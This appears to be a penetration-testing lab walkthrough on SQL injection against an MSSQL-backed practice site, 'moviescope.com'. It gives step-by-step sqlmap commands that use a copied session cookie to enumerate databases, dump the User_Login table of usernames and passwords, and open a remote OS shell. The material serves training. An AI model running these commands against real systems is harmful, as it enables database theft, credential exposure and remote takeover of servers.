- SQL injection is an alarming issue for all database-driven websites. An attack can be attempted on any normal website or software package based on how it is used and how it processes user-supplied data. SQL injection attacks are performed on SQL databases with weak codes that do not adequately filter, use strong typing, or correctly execute user input. This vulnerability can be used by attackers to execute database queries to collect sensitive information, modify database entries, or attach malicious code, resulting in total compromise of the most sensitive data.

- As an ethical hacker or pen tester, in order to assess the systems in your target network, you should test relevant web applications for various vulnerabilities and flaws, and then exploit those vulnerabilities to perform SQL injection attacks.
- SQL injection can be used to implement the following attacks:

	- **Authentication bypass**: An attacker logs onto an application without providing a valid username and password and gains administrative privileges
	- **Authorization bypass**: An attacker alters authorization information stored in the database by exploiting SQL injection vulnerabilities
	- **Information disclosure**: An attacker obtains sensitive information that is stored in the database
	- **Compromised data integrity**: An attacker defaces a webpage, inserts malicious content into webpages, or alters the contents of a database
	- **Compromised availability of data**: An attacker deletes specific information, the log, or audit information in a database
	- **Remote code execution**: An attacker executes a piece of code remotely that can compromise the host OS



### Perform an SQL Injection Attack on an MSSQL Database

- Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

- Here, we will use an SQL injection query to perform SQL injection attacks on an MSSQL database.

- An SQL injection query exploits the normal execution of SQL statements. It involves submitting a request with malicious values that will execute normally but return data from the database that you want. You can “inject” these malicious values in the queries, because of the application’s inability to filter them before processing. If the values submitted by users are not properly validated by an application, it is a potential target for an SQL injection attack.



### Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap

- sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features, and a broad range of switches—from database fingerprinting and data fetching from the database to accessing the underlying file system and executing commands on the OS via out-of-band connections.

- You can use sqlmap to perform SQL injection on a target website using various techniques, including Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band SQL injection.

- In this task, we will use sqlmap to perform SQL injection attack against MSSQL to extract databases.
- In this lab, you will pretend that you are a registered user on the **http://www.moviescope.com** website, and you want to crack the passwords of the other users from the website’s database.
- Type **http://www.moviescope.com/** and press **Enter**. A **Login** page loads; enter the **Username** and **Password** as **sam** and **test**, respectively. Click the **Login** button.
- Once you are logged into the website, click the **View Profile** tab on the menu bar and, when the page has loaded, make a note of the URL in the address bar of the browser.
- Right-click anywhere on the webpage and click **Inspect Element (Q)** from the context menu.
- The **Developer Tools** frame appears in the lower section of the browser window. Click the **Console** tab, type **document.cookie** in the lower-left corner of the browser, and press **Enter**.
- Select the cookie value, then right-click and copy it. Minimize the web browser.
- Open Terminal
	> sudo su
	> cd
	> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" #copiedcookie" --dbs
	- In this query, **-u** specifies the target URL, **--cookie** specifies the HTTP cookie header value, and **--dbs** enumerates DBMS databases.
	- The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the **MovieScope** website.
	- If the message **Do you want to skip test payloads specific for other DBMSes? [Y/n]** appears, type **Y** and press **Enter**.
	- If the message **for the remaining tests, do you want to include all tests for ‘Microsoft SQL Server’ extending provided level (1) and risk (1) values? [Y/n]** appears, type **Y** and press **Enter**.
	- Similarly, if any other message appears, type **Y** and press **Enter** to continue.
	- sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS.
	- Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with the database **moviescope**.

	> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" #copiedcookie" -D moviescope --tables ()
	- In this query, **-D** specifies the DBMS database to enumerate and **--tables** enumerates DBMS database tables.
	- The above query causes sqlmap to scan the **moviescope** database for tables located in the database.
	- sqlmap retrieves the table contents of the moviescope database and displays them.
	- Now, you need to retrieve the table content of the column **User_Login**.
	
	>  sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" #copiedcookie" -D moviescope -T User_Login --dump (to dump all the **User_Login** table content)
	- sqlmap retrieves the complete **User_Login** table data from the database moviescope, containing all users’ usernames under the **Uname** column and passwords under the **password** column.


- Now to initiate an interactive shell
	> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" #copiedcookie" --os-shell
	- In this query, **--os-shell** is the prompt for an interactive OS shell.
	- If the message **do you want sqlmap to try to optimize value(s) for DBMS delay responses** appears, type **Y** and press **Enter** to continue.
	- Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type **hostname** and press **Enter** to find the machine name where the site is running.
	- Type **TASKLIST** and press **Enter** to view a list of tasks that are currently running on the target system.
	- Following the same process, you can use various other commands to obtain further detailed information about the target machine.
		- To view the available commands under the OS shell, type **help** and press **Enter**.